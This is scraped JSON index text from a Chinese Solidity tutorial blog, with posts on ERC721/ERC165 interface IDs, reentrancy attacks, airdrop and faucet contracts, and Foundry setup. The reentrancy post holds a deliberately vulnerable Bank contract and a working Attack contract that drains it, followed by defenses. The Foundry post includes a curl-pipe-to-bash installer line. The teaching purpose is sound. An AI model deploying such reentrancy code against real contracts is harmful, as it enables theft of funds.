拓展到编程语言的世界中去，无论是Java的interface，还是Rust的Trait(当然solidity中和trait更像的是library)，只要是和接口沾边的，都在透露着一种这样的意味：接口是某些行为的集合(在solidity中更甚，接口完全等价于函数选择器的集合)，某个类型只要实现了某个接口，就表明该类型拥有这样的一种功能。因此，只要某个contract类型实现了上述的ERC721TokenReceiver接口(更具体而言就是实现了onERC721Received这个函数),该contract类型就对外表明了自己拥有管理NFT的能力。当然操作NFT的逻辑被实现在该合约其他的函数中。 ERC721标准在执行safeTransferFrom的时候会检查目标合约是否实现了onERC721Received函数,这是一种利用ERC165思想进行的操作。 那究竟什么是ERC165呢? ERC165是一种对外表明自己实现了哪些接口的技术标准。就像上面所说的，实现了一个接口就表明合约拥有种特殊能力。有一些合约与其他合约交互时，期望目标合约拥有某些功能，那么合约之间就能够通过ERC165标准对对方进行查询以检查对方是否拥有相应的能力。 以ERC721合约为例，当外部对某个合约进行检查其是否是ERC721时，怎么做？ 。按照这个说法，检查步骤应该是首先检查该合约是否实现了ERC165, 再检查该合约实现的其他特定接口。此时该特定接口是IERC721. IERC721的是ERC721的基本接口(为什么说基本，是因为还有其他的诸如ERC721Metadata ERC721Enumerable 这样的拓展)： /// 注意这个**0x80ac58cd** /// **⚠⚠⚠ Note: the ERC-165 identifier for this interface is 0x80ac58cd. ⚠⚠⚠** interface ERC721 /* is ERC165 */ { event Transfer(address indexed _from, address indexed _to, uint256 indexed _tokenId); event Approval(address indexed _owner, address indexed _approved, uint256 indexed _tokenId); event ApprovalForAll(address indexed _owner, address indexed _operator, bool _approved); function balanceOf(address _owner) external view returns (uint256); function ownerOf(uint256 _tokenId) external view returns (address); function safeTransferFrom(address _from, address _to, uint256 _tokenId, bytes data) external payable; function safeTransferFrom(address _from, address _to, uint256 _tokenId) external payable; function transferFrom(address _from, address _to, uint256 _tokenId) external payable; function approve(address _approved, uint256 _tokenId) external payable; function setApprovalForAll(address _operator, bool _approved) external; function getApproved(uint256 _tokenId) external view returns (address); function isApprovedForAll(address _owner, address _operator) external view returns (bool); } 0x80ac58cd= bytes4(keccak256(ERC721.Transfer.selector) ^ keccak256(ERC721.Approval.selector) ^ ··· ^keccak256(ERC721.isApprovedForAll.selector))，这是ERC165规定的计算方式。 那么，类似的，能够计算出ERC165本身的接口(它的接口里只有一个 function supportsInterface(bytes4 interfaceID) external view returns (bool); 函数，对其进行bytes4(keccak256(supportsInterface.selector)) 得到0x01ffc9a7。此外，ERC721还定义了一些拓展接口，比如ERC721Metadata ，长这样： /// Note: the ERC-165 identifier for this interface is 0x5b5e139f. interface ERC721Metadata /* is ERC721 */ { function name() external view returns (string _name); function symbol() external view returns (string _symbol); function tokenURI(uint256 _tokenId) external view returns (string); // 这个很重要，前端展示的小图片的链接都是这个函数返回的 } 这个0x5b5e139f 的计算就是: IERC721Metadata.name.selector ^ IERC721Metadata.symbol.selector ^ IERC721Metadata.tokenURI.selector solamte实现的ERC721.sol是怎么完成这些ERC165要求的特性的呢？ function supportsInterface(bytes4 interfaceId) public view virtual returns (bool) { return interfaceId == 0x01ffc9a7 || // ERC165 Interface ID for ERC165 interfaceId == 0x80ac58cd || // ERC165 Interface ID for ERC721 interfaceId == 0x5b5e139f; // ERC165 Interface ID for ERC721Metadata } 没错就这么简单。当外界按照link1 的步骤去做检查的时候，如果外界想检查这个合约是否实现了165,好说，就是supportsInterface函数在入参是0x01ffc9a7时必须返回true，在入参是0xffffffff时，返回值必须是false。上述实现完美达成要求。 当外界想检查这个合约是否是ERC721的时候，好说，入参是0x80ac58cd 的时候表明外界想做这个检查。返回true。 当外界想检查这个合约是否实现ERC721的拓展ERC721Metadata接口时，入参是0x5b5e139f。好说，返回了true。 并且由于该函数是virtual的。因此该合约的使用者可以继承该合约，然后继续实现ERC721Enumerable 接口。实现完里面的什么totalSupply 啊之类的函数之后，把继承的supportsInterface重实现为 function supportsInterface(bytes4 interfaceId) public view virtual returns (bool) { return interfaceId == 0x01ffc9a7 || // ERC165 Interface ID for ERC165 interfaceId == 0x80ac58cd || // ERC165 Interface ID for ERC721 interfaceId == 0x5b5e139f || // ERC165 Interface ID for ERC721Metadata interfaceId == 0x780e9d63; // ERC165 Interface ID for ERC721Enumerable } 这样不仅优雅，简洁，而且可拓展性拉满。 ","date":"2022-08-21","objectID":"/posts/solidity-erc721.html:9:0","tags":["solidity","basic"],"title":"非同质化代币标准ERC721","uri":"/posts/solidity-erc721.html"},{"categories":["基础知识","Solidity 应用"],"content":"总结 利用ERC721做了一个免费铸造的APE NFT，元数据直接调用于BAYC。ERC721标准仍在不断发展中，目前比较流行的版本为ERC721Enumerable（提高NFT可访问性）和ERC721A（节约铸造gas）。 ","date":"2022-08-21","objectID":"/posts/solidity-erc721.html:10:0","tags":["solidity","basic"],"title":"非同质化代币标准ERC721","uri":"/posts/solidity-erc721.html"},{"categories":["合约安全"],"content":" 引言 它曾导致以太坊分叉为 ETH 和 ETC（以太经典）。 ","date":"2022-08-20","objectID":"/posts/solidity-smart-contract-security-re-entrancy.html:0:0","tags":["solidity","security","fallback","modifier"],"title":"合约安全：重入攻击","uri":"/posts/solidity-smart-contract-security-re-entrancy.html"},{"categories":["合约安全"],"content":"1 什么是重入攻击？ 重入攻击是智能合约中最常见的一种攻击，攻击者通过合约漏洞（例如fallback函数）循环调用合约，将合约中资产转走或铸造大量代币。 一些著名的重入攻击事件： 2016年，The DAO合约被重入攻击，黑客盗走了合约中的 3,600,000 枚 ETH，并导致以太坊分叉为 ETH 链和 ETC（以太经典）链。 2019年，合成资产平台 Synthetix 遭受重入攻击，被盗 3,700,000 枚 sETH。 2020年，借贷平台 Lendf.me 遭受重入攻击，被盗 $25,000,000。 2021年，借贷平台 CREAM FINANCE 遭受重入攻击，被盗 $18,800,000。 2022年，算法稳定币项目 Fei 遭受重入攻击，被盗 $80,000,000。 距离 The DAO 被重入攻击已经多年了，但每年还是会有几次因重入漏洞而损失千万美元的项目，因此理解这个漏洞非常重要。 抢银行的故事 为了让大家更好理解，这里给大家讲一个\"黑客5oneXj抢银行\"的故事。 以太坊银行的柜员都是机器人（Robot），由智能合约控制。当正常用户（User）来银行取钱时，它的服务流程： 查询用户的 ETH 余额，如果大于0，进行下一步。 将用户的 ETH 余额从银行转给用户，并询问用户是否收到。 将用户名下的余额更新为0。 一天黑客 5oneXj 来到了银行，这是他和机器人柜员的对话： 5oneXj : 我要取钱，1 ETH。 Robot: 正在查询您的余额：1 ETH。正在转帐1 ETH到您的账户。您收到钱了吗？ 5oneXj : 等等，我要取钱，1 ETH。 Robot: 正在查询您的余额：1 ETH。正在转帐1 ETH到您的账户。您收到钱了吗？ 5oneXj : 等等，我要取钱，1 ETH。 Robot: 正在查询您的余额：1 ETH。正在转帐1 ETH到您的账户。您收到钱了吗？ 5oneXj : 等等，我要取钱，1 ETH。 … 最后，黑客5oneXj通过重入攻击的漏洞，把银行的资产搬空了，银行卒。 ","date":"2022-08-20","objectID":"/posts/solidity-smart-contract-security-re-entrancy.html:1:0","tags":["solidity","security","fallback","modifier"],"title":"合约安全：重入攻击","uri":"/posts/solidity-smart-contract-security-re-entrancy.html"},{"categories":["合约安全"],"content":"2 漏洞合约复现 ","date":"2022-08-20","objectID":"/posts/solidity-smart-contract-security-re-entrancy.html:2:0","tags":["solidity","security","fallback","modifier"],"title":"合约安全：重入攻击","uri":"/posts/solidity-smart-contract-security-re-entrancy.html"},{"categories":["合约安全"],"content":"2.1 银行合约 银行合约非常简单，包含1个状态变量 balanceOf 记录所有用户的以太坊余额，以及包含3个函数： deposit()： 存款函数，将ETH存入银行合约，并更新用户的余额。 withdraw()： 提款函数，将调用者的余额转给它。具体步骤和上面故事中一样：查询余额，转账，更新余额。注意：这个函数有重入漏洞！ getBalance()： 获取银行合约里的ETH余额。 contract Bank { mapping (address =\u003e uint256) public balanceOf; // 余额mapping // 存入ether，并更新余额 function deposit() external payable { balanceOf[msg.sender] += msg.value; } // 提取msg.sender的全部ether function withdraw() external { uint256 balance = balanceOf[msg.sender]; // 获取余额 require(balance \u003e 0, \"Insufficient balance\"); // 转账 ether !!! 可能激活恶意合约的fallback/receive函数，有重入风险！ (bool success, ) = msg.sender.call{value: balance}(\"\"); require(success, \"Failed to send Ether\"); // 更新余额 balanceOf[msg.sender] = 0; } // 获取银行合约的余额 function getBalance() external view returns (uint256) { return address(this).balance; } } ","date":"2022-08-20","objectID":"/posts/solidity-smart-contract-security-re-entrancy.html:2:1","tags":["solidity","security","fallback","modifier"],"title":"合约安全：重入攻击","uri":"/posts/solidity-smart-contract-security-re-entrancy.html"},{"categories":["合约安全"],"content":"2.2 攻击合约 重入攻击的一个攻击点就是合约转账ETH的地方： 转账ETH的目标地址如果是合约，会触发对方合约的fallback（回退）函数，从而造成循环调用的可能。 (bool success, ) = msg.sender.call{value: balance}(\"\"); 假如黑客在攻击合约中的 fallback() 或 receive() 函数中重新调用了Bank合约的 withdraw() 函数，就会造成5oneXj抢银行故事中的循环调用，不断让Bank合约转账给攻击者，最终将合约的ETH提空。 receive() external payable { bank.withdraw(); } 下面我们看下攻击合约，它的逻辑非常简单，就是通过 receive() 回退函数循环调用Bank合约的 withdraw() 函数。它有1个状态变量bank用于记录Bank合约地址，以及包含4个函数： 构造函数: 初始化Bank合约地址。 receive(): 回调函数，在接收ETH时被触发，并再次调用Bank合约的 withdraw() 函数，循环提款。 attack()： 攻击函数，先Bank合约的 deposit() 函数存款，然后调用withdraw()发起第一次提款，之后Bank合约的 withdraw() 函数和攻击合约的receive()函数会循环调用，将Bank合约的ETH提空。 getBalance()： 获取攻击合约里的ETH余额。 contract Attack { Bank public bank; // Bank合约地址 // 初始化Bank合约地址 constructor(Bank _bank) { bank = _bank; } // 回调函数，用于重入攻击Bank合约，反复的调用目标的 withdraw 函数 receive() external payable { if (bank.getBalance() \u003e= 1 ether) { bank.withdraw(); } } // 攻击函数，调用时 msg.value 设为 1 ether function attack() external payable { require(msg.value == 1 ether, \"Require 1 Ether to attack\"); bank.deposit{value: 1 ether}(); bank.withdraw(); } // 获取本合约的余额 function getBalance() external view returns (uint256) { return address(this).balance; } } ","date":"2022-08-20","objectID":"/posts/solidity-smart-contract-security-re-entrancy.html:2:2","tags":["solidity","security","fallback","modifier"],"title":"合约安全：重入攻击","uri":"/posts/solidity-smart-contract-security-re-entrancy.html"},{"categories":["合约安全"],"content":"3 Remix演示 部署Bank合约，调用deposit()函数，转入20 ETH。 切换到攻击者钱包，部署Attack合约。 调用Atack合约的attack()函数发动攻击，调用时需转账1 ETH。 调用Bank合约的getBalance()函数，发现余额已被提空。 调用Attack合约的getBalance()函数，可以看到余额变为21 ETH，重入攻击成功。 ","date":"2022-08-20","objectID":"/posts/solidity-smart-contract-security-re-entrancy.html:3:0","tags":["solidity","security","fallback","modifier"],"title":"合约安全：重入攻击","uri":"/posts/solidity-smart-contract-security-re-entrancy.html"},{"categories":["合约安全"],"content":"4 预防办法 目前主要有两种办法来预防可能的重入攻击漏洞： 检查-影响-交互模式（checks-effect-interaction）和重入锁。 ","date":"2022-08-20","objectID":"/posts/solidity-smart-contract-security-re-entrancy.html:4:0","tags":["solidity","security","fallback","modifier"],"title":"合约安全：重入攻击","uri":"/posts/solidity-smart-contract-security-re-entrancy.html"},{"categories":["合约安全"],"content":"4.1 检查-影响-交互模式 检查-影响-交互模式强调编写函数时，要先检查状态变量是否符合要求，紧接着更新状态变量（例如余额），最后再和别的合约交互。如果我们将Bank合约withdraw()函数中的更新余额提前到转账ETH之前，就可以修复漏洞： function withdraw() external { uint256 balance = balanceOf[msg.sender]; require(balance \u003e 0, \"Insufficient balance\"); // 检查-效果-交互模式（checks-effect-interaction）：先更新余额变化，再发送ETH // 重入攻击的时候，balanceOf[msg.sender]已经被更新为0了，不能通过上面的检查。 balanceOf[msg.sender] = 0; (bool success, ) = msg.sender.call{value: balance}(\"\"); require(success, \"Failed to send Ether\"); } ","date":"2022-08-20","objectID":"/posts/solidity-smart-contract-security-re-entrancy.html:4:1","tags":["solidity","security","fallback","modifier"],"title":"合约安全：重入攻击","uri":"/posts/solidity-smart-contract-security-re-entrancy.html"},{"categories":["合约安全"],"content":"4.2 重入锁 重入锁是一种防止重入函数的修饰器（modifier），它包含一个默认为0的状态变量_status。被nonReentrant重入锁修饰的函数，在第一次调用时会检查_status是否为0，紧接着将_status的值改为1，调用结束后才会再改为0。这样，当攻击合约在调用结束前第二次的调用就会报错，重入攻击失败。如果你不了解修饰器，可以阅读WTF Solidity极简教程第11讲：修饰器。 uint256 private _status; // 重入锁 // 重入锁 modifier nonReentrant() { // 在第一次调用 nonReentrant 时，_status 将是 0 require(_status == 0, \"ReentrancyGuard: reentrant call\"); // 在此之后对 nonReentrant 的任何调用都将失败 _status = 1; _; // 调用结束，将 _status 恢复为0 _status = 0; } 只需要用nonReentrant重入锁修饰withdraw()函数，就可以预防重入攻击了。 // 用重入锁保护有漏洞的函数 function withdraw() external nonReentrant{ uint256 balance = balanceOf[msg.sender]; require(balance \u003e 0, \"Insufficient balance\"); (bool success, ) = msg.sender.call{value: balance}(\"\"); require(success, \"Failed to send Ether\"); balanceOf[msg.sender] = 0; } ","date":"2022-08-20","objectID":"/posts/solidity-smart-contract-security-re-entrancy.html:4:2","tags":["solidity","security","fallback","modifier"],"title":"合约安全：重入攻击","uri":"/posts/solidity-smart-contract-security-re-entrancy.html"},{"categories":["合约安全"],"content":"5 总结 介绍了以太坊最常见的一种攻击——重入攻击，并编了一个5oneXj抢银行的小故事方便大家理解，最后我们介绍了两种预防重入攻击的办法：检查-影响-交互模式（checks-effect-interaction）和重入锁。在例子中，黑客利用了回退函数在目标合约进行ETH转账时进行重入攻击。实际业务中，ERC721和ERC1155的safeTransfer()和safeTransferFrom()安全转账函数，还有ERC777的回退函数，都可能会引发重入攻击。对于新手，我的建议是用重入锁保护所有可能改变合约状态的external函数，虽然可能会消耗更多的gas，但是可以预防更大的损失。 ","date":"2022-08-20","objectID":"/posts/solidity-smart-contract-security-re-entrancy.html:5:0","tags":["solidity","security","fallback","modifier"],"title":"合约安全：重入攻击","uri":"/posts/solidity-smart-contract-security-re-entrancy.html"},{"categories":["基础知识","Solidity 应用"],"content":" 引言 在币圈，最开心的一件事就是领空投，空手套白狼。 ","date":"2022-07-17","objectID":"/posts/solidity-erc20-airdrop.html:0:0","tags":["solidity","basic"],"title":"如何批量发送空投？增加空投效率","uri":"/posts/solidity-erc20-airdrop.html"},{"categories":["基础知识","Solidity 应用"],"content":"空投 Airdrop 空投是币圈中一种营销策略，项目方将代币免费发放给特定用户群体。为了拿到空投资格，用户通常需要完成一些简单的任务，如测试产品、分享新闻、介绍朋友等。项目方通过空投可以获得种子用户，而用户可以获得一笔财富，两全其美。 因为每次接收空投的用户很多，项目方不可能一笔一笔的转账。利用智能合约批量发放ERC20代币，可以显著提高空投效率。 ","date":"2022-07-17","objectID":"/posts/solidity-erc20-airdrop.html:1:0","tags":["solidity","basic"],"title":"如何批量发送空投？增加空投效率","uri":"/posts/solidity-erc20-airdrop.html"},{"categories":["基础知识","Solidity 应用"],"content":"空投代币合约 Airdrop空投合约逻辑非常简单：利用循环，一笔交易将ERC20代币发送给多个地址。合约中包含两个函数 getSum()函数：返回uint数组的和。 // 数组求和函数 function getSum(uint256[] calldata _arr) public pure returns(uint sum) { for(uint i = 0; i \u003c _arr.length; i++) sum = sum + _arr[i]; } multiTransferToken()函数：发送ERC20代币空投，包含3个参数： _token：代币合约地址（address类型） _addresses：接收空投的用户地址数组（address[]类型） _amounts：空投数量数组，对应_addresses里每个地址的数量（uint[]类型） 该函数有两个检查：第一个require检查了_addresses和_amounts两个数组长度是否相等；第二个require检查了空投合约的授权额度大于要空投的代币数量总和。 /// @notice 向多个地址转账ERC20代币，使用前需要先授权 /// /// @param _token 转账的ERC20代币地址 /// @param _addresses 空投地址数组 /// @param _amounts 代币数量数组（每个地址的空投数量） function multiTransferToken( address _token, address[] calldata _addresses, uint256[] calldata _amounts ) external { // 检查：_addresses和_amounts数组的长度相等 require(_addresses.length == _amounts.length, \"Lengths of Addresses and Amounts NOT EQUAL\"); IERC20 token = IERC20(_token); // 声明IERC合约变量 uint _amountSum = getSum(_amounts); // 计算空投代币总量 // 检查：授权代币数量 \u003e= 空投代币总量 require(token.allowance(msg.sender, address(this)) \u003e= _amountSum, \"Need Approve ERC20 token\"); // for循环，利用transferFrom函数发送空投 for (uint8 i; i \u003c _addresses.length; i++) { token.transferFrom(msg.sender, _addresses[i], _amounts[i]); } } multiTransferETH()函数：发送ETH空投，包含2个参数： _addresses：接收空投的用户地址数组（address[]类型） _amounts：空投数量数组，对应_addresses里每个地址的数量（uint[]类型） /// 向多个地址转账ETH function multiTransferETH( address payable[] calldata _addresses, uint256[] calldata _amounts ) public payable { // 检查：_addresses和_amounts数组的长度相等 require(_addresses.length == _amounts.length, \"Lengths of Addresses and Amounts NOT EQUAL\"); uint _amountSum = getSum(_amounts); // 计算空投ETH总量 // 检查转入ETH等于空投总量 require(msg.value == _amountSum, \"Transfer amount error\"); // for循环，利用transfer函数发送ETH for (uint256 i = 0; i \u003c _addresses.length; i++) { _addresses[i].transfer(_amounts[i]); } } ","date":"2022-07-17","objectID":"/posts/solidity-erc20-airdrop.html:1:1","tags":["solidity","basic"],"title":"如何批量发送空投？增加空投效率","uri":"/posts/solidity-erc20-airdrop.html"},{"categories":["基础知识","Solidity 应用"],"content":"空投实践 部署ERC20代币合约，并给自己mint10000 单位代币。 部署Airdrop空投合约。 利用ERC20代币合约中的approve()函数，给Airdrop空投合约授权10000 单位代币。 执行Airdrop合约的multiTransferToken()函数进行空投， _token填ERC20代币地址，_addresses和_amounts按照以下填写 // _addresses填写 [\"0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2\", \"0x5B38Da6a701c568545dCfcB03FcB875f56beddC4\"] // _amounts填写 [100, 200] 利用ERC20合约的balanceOf()函数查询上面用户地址的代币余额，成功变为100和200，空投成功！ ","date":"2022-07-17","objectID":"/posts/solidity-erc20-airdrop.html:1:2","tags":["solidity","basic"],"title":"如何批量发送空投？增加空投效率","uri":"/posts/solidity-erc20-airdrop.html"},{"categories":["基础知识","Solidity 应用"],"content":" 引言 当人渴的时候，就要去水龙头接水；当人想要免费代币的时候，就要去代币水龙头领。代币水龙头就是让用户免费领代币的网站/应用。 最早的代币水龙头是比特币（BTC）水龙头： 现在BTC一枚要$30,000，但是在2010年，BTC的价格只有不到$0.1，并且持有人很少。为了扩大影响力，比特币社区的Gavin Andresen开发了BTC水龙头，让别人可以免费领BTC。撸羊毛大家都喜欢，当时就有很多人去撸，一部分变为了BTC的信徒。BTC水龙头一共送出了超过19,700枚BTC，现在价值约6亿美元！ ","date":"2022-06-24","objectID":"/posts/solidity-erc20-faucet.html:0:0","tags":["solidity","basic"],"title":"简易实现基于ERC20的水龙头合约","uri":"/posts/solidity-erc20-faucet.html"},{"categories":["基础知识","Solidity 应用"],"content":"ERC20水龙头合约 这里，我们实现一个简版的ERC20水龙头，逻辑非常简单：我们将一些ERC20代币转到水龙头合约里，用户可以通过合约的requestToken()函数来领取100单位的代币，每个地址只能领一次。 ","date":"2022-06-24","objectID":"/posts/solidity-erc20-faucet.html:1:0","tags":["solidity","basic"],"title":"简易实现基于ERC20的水龙头合约","uri":"/posts/solidity-erc20-faucet.html"},{"categories":["基础知识","Solidity 应用"],"content":"状态变量 我们在水龙头合约中定义3个状态变量 amountAllowed设定每次能领取代币数量（默认为100，不是一百枚，因为代币有小数位数）。 tokenContract记录发放的ERC20代币合约地址。 requestedAddress记录领取过代币的地址。 uint256 public amountAllowed = 100; // 每次领 100 单位代币 address public tokenContract; // token合约地址 mapping(address =\u003e bool) public requestedAddress; // 记录领取过代币的地址 ","date":"2022-06-24","objectID":"/posts/solidity-erc20-faucet.html:1:1","tags":["solidity","basic"],"title":"简易实现基于ERC20的水龙头合约","uri":"/posts/solidity-erc20-faucet.html"},{"categories":["基础知识","Solidity 应用"],"content":"事件 水龙头合约中定义了1个SendToken事件，记录了每次领取代币的地址和数量，在requestTokens()函数被调用时释放。 // SendToken事件 event SendToken(address indexed Receiver, uint256 indexed Amount); ","date":"2022-06-24","objectID":"/posts/solidity-erc20-faucet.html:1:2","tags":["solidity","basic"],"title":"简易实现基于ERC20的水龙头合约","uri":"/posts/solidity-erc20-faucet.html"},{"categories":["基础知识","Solidity 应用"],"content":"函数 合约中只有两个函数： 构造函数：初始化tokenContract状态变量，确定发放的ERC20代币地址。 // 部署时设定ERC2代币合约 constructor(address _tokenContract) { tokenContract = _tokenContract; // set token contract } requestTokens()函数，用户调用它可以领取ERC20代币。 // 用户领取代币函数 function requestTokens() external { // 每个地址只能领一次 require(requestedAddress[msg.sender] == false, \"Can't Request Multiple Times!\"); // 创建IERC20合约对象 IERC20 token = IERC20(tokenContract); // 判断水龙头空了 require(token.balanceOf(address(this)) \u003e= amountAllowed, \"Faucet Empty!\"); token.transfer(msg.sender, amountAllowed); // 发送token requestedAddress[msg.sender] = true; // 记录领取地址 emit SendToken(msg.sender, amountAllowed); // 释放SendToken事件 } ","date":"2022-06-24","objectID":"/posts/solidity-erc20-faucet.html:1:3","tags":["solidity","basic"],"title":"简易实现基于ERC20的水龙头合约","uri":"/posts/solidity-erc20-faucet.html"},{"categories":["基础知识","Solidity 应用"],"content":"Remix演示 首先，部署ERC20代币合约，名称和符号为FT，并给自己mint 10000 单位代币。 部署Faucet水龙头合约，初始化的参数填上面ERC20代币的合约地址。 利用ERC20代币合约的transfer()函数，将 10000 单位代币转账到Faucet合约地址。 换一个新账户，调用Faucet合约requestTokens()函数，领取代币。可以在终端看到SendToken事件被释放。 在ERC20代币合约上利用balanceOf查询领取水龙头的账户余额，可以看到余额变为100，领取成功！ ","date":"2022-06-24","objectID":"/posts/solidity-erc20-faucet.html:2:0","tags":["solidity","basic"],"title":"简易实现基于ERC20的水龙头合约","uri":"/posts/solidity-erc20-faucet.html"},{"categories":["工具"],"content":"什么是 Foundry? 来自 Foundry 官网 (getfoundry.sh) 对该工具的介绍： Foundry是 一个用 Rust编写的用于以太坊应用程序开发的极快、可移植和模块化的工具包 ( Foundry is a blazing fast, portable and modular toolkit for Ethereum application development written in Rust.) 项目设施： 官网：https://getfoundry.sh Github 仓库：https://github.com/foundry-rs/foundry 文档：https://book.getfoundry.sh 介绍的解释： 用 Rust 语言编写： Foundry 完全采用 Rust 语言开发， Github 上的源代码仓库 是一个 Rust 语言工程。我们可以通过获取 Release 的二进制文件，也可以通过 Rust 语言的 cargo 包管理工具编译\u0026构建安装; 用于以太坊应用程序开发： Foundry 作为 以太坊（Solidity语言）项目/应用程序开发的 “工程化” 工具，提供专业 Solidity 开发环境与“工具链”。通过它你可以快速、方便的完成依赖项管理、编译、运行测试、部署，并可以通过命令行和 Solidity 脚本与链进行交互; 极快： Foundry 利用 ethers-solc 比较于传统通过 Node.js 辅助完成的测试用例/工程，Foundry 构建、测试的执行速度很快（创建一个工程，写一些测试用例跑一下会感受到震撼）; 可移植: Foundry 工程支持与其他类型的工程集成（如：与 Hardhat 集成）; 模块化：通过 git submodule \u0026 构建目录映射，快速方便的引入依赖; ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:1:0","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"为什么选择 Foundry？ 如果你满足以下条件或有过类似体验，你一定要试试 Foundry： 如果你有 Rust “语言信仰”，如果你是个专业的 以太坊（Solidity语言）应用开发者； 你曾经用过类似 Hardhat.js 这样的工具； 你厌倦了大量测试用例的等待，需要有工具更加快速的跑完你的测试用例； 你觉得处理 BigNumber 稍微有一点点🤏麻烦; 有过通过 Solidity 语言本身完成测试用例（或测试合约的合约）的需求； 你觉得通过 git submodule 的方式管理依赖更加方便（而不是 npm）； ··· 如果有以下情况 Foundry 可能不适合你： Solidity 初学者； 你的项目不需要写测试用例、不需要过多在 Solidity 工程方面的自动化操作； ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:2:0","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"Foundry 的主要功能 该部分源于 Foundry book (https://book.getfoundry.sh)，让章节的理解更容易。 创建以太坊（Solidity）智能合约应用开发项目，开发已有的项目; 管理以太坊(Solidity)智能合约的依赖项目; 创建由 Solidity 语言编写的测试用例（并且能很快速的执行测试用例）: 并且支持模糊测试与差异测试等方便、专业的测试方式; 通过 Cheatcodes（作弊码） 在 Solidity语言 编写的测试用例中进行 “EVM环境之外” 的 vm 功能进行交互与断言：更换测试用例语句执行者的钱包地址（更换 msg.sender）、对 EVM 外的 Event 事件进行断言； 执行过程与错误追踪：“函数堆栈”级的错误追踪（Traces）； 部署合约和自动化的完成scan上合约的开源验证； 在项目中支持完整的gas使用情况追踪：包括合约测试细节的gas用量和gas报告； 交互式调试器； ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:3:0","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"Foundry 的组成 Foundry 项目由 Forge, Cast, Anvil 几个部分（命令行工具）组成 Forge: Foundry 项目中执行初始化项目、管理依赖、测试、构建、部署智能合约的命令行工具; Cast: Foundry 项目中与 RPC 节点交互的命令行工具。可以进行智能合约的调用、发送交易数据或检索任何类型的链上数据; Anvil: Foundry 项目中启动的本地测试网/节点的命令行工具。可以使用它配合测试前端应用与部署在该测试网的合约或通过 RPC 进行交互; ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:4:0","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"快速创建一个 Foundry 项目 内容出自 Foundry book 的 Getting Start 部分 即将完成的过程： 安装 Foundry; 初始化一个 Foundry 项目; 理解初始化过程中添加的智能合约、测试用例； 执行构建\u0026测试; ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:5:0","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"安装 Foundry 对于不同的环境： MacOS / Linux （等 Unix like 系统）： 通过 foundryup 安装（👈Foundry 项目首页推荐的方式）; 通过 源代码构建 安装; Windows 通过 源代码构建 安装; Docker 环境 参考 Foundry Package: https://github.com/gakonst/foundry/pkgs/container/foundry Github Action： 用于构建完整的 Action 流程 参考 https://github.com/foundry-rs/foundry-toolchain 通过脚本快速安装 通过有bash的（或者类Unix环境）快速安装 $ curl -L https://foundry.paradigm.xyz | bash 执行后将会安装 foundryup，在此后执行它 $ foundryup 如果一切顺利，您现在可以使用三个二进制文件：forge、cast 和 anvil。 ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:5:1","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"初始化一个 Foundry 项目 通过 forge 的 forge init 初始化项目 “hello_wtf” $ forge init hello_wtf Initializing /Users/username/hello_wtf... Installing forge-std in \"/Users/username/hello_wtf/lib/forge-std\" (url: Some(\"https://github.com/foundry-rs/forge-std\"), tag: None) Installed forge-std Initialized forge project. 该过程通过安装依赖forge-std初始化了一个 Foundry 项目 在项目目录中看到 $ tree -L 2 . ├── foundry.toml # Foundry 的 package 配置文件 ├── lib # Foundry 的依赖库 │ └── forge-std # 工具 forge 的基础依赖 ├── script # Foundry 的脚本 │ └── Counter.s.sol # 示例合约 Counter 的脚本 ├── src # 智能合约的业务逻辑、源代码将会放在这里 │ └── Counter.sol # 示例合约 └── test # 测试用例目录 └── Counter.t.sol # 示例合约的测试用例 提示： 依赖项作为 git submodule 在 ./lib 目录中 关于 Foundry 的 package 配置文件请详细参考: https://github.com/foundry-rs/foundry/blob/master/config/README.md#all-options ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:5:2","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"理解初始化过程中添加的智能合约、测试用例 src 目录 主要由业务逻辑构成 src 目录中的 ./src/Counter.sol: // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; contract Counter { // 一个很简单的 Counter 合约 uint256 public number; // 维护一个 public 的 uint256 数字 // 设置 number 变量的内容 function setNumber(uint256 newNumber) public { number = newNumber; } // 让 number 变量的内容自增 function increment() public { number++; } } script 目录 参考 Foundry 项目文档中的 Solidity-scripting 该目录主要由“部署”脚本构成（也可通过该脚本调用 Foundry 提供的 vm 功能实现应用业务逻辑之外的高级功能，等同于 Hardhat.js 中的 scripts）。 详见script 目录中的 ./script/Counter.s.sol： // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; // 许可 和 Solidity版本标识 import \"forge-std/Script.sol\"; // 引入foundry forge中的Script库 import \"../src/Counter.sol\"; // 引入要部署的Counter合约 // 部署脚本继承了Script合约 contract CounterScript is Script { // 可选函数，在每个函数运行之前被调用 function setUp() public {} // 部署合约时会调用run()函数 function run() public { vm.startBroadcast(); // 开始部署 new Counter(); // 创建合约 vm.stopBroadcast(); // 结束部署 } } Foundry的部署脚本是一个用Solidity写的智能合约，虽然它不会被部署，但符合Solidity的规范。你可以用forge script运行脚本并部署合约。 forge script script/Counter.s.sol:CounterScript test 目录 主要由合约的测试用例构成 test 目录中的 ./test/Counter.t.sol // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Test.sol\"; // 引入 forge-std 中用于测试的依赖 import \"../src/Counter.sol\"; // 引入用于测试的业务合约 // 基于 forge-std 的 test 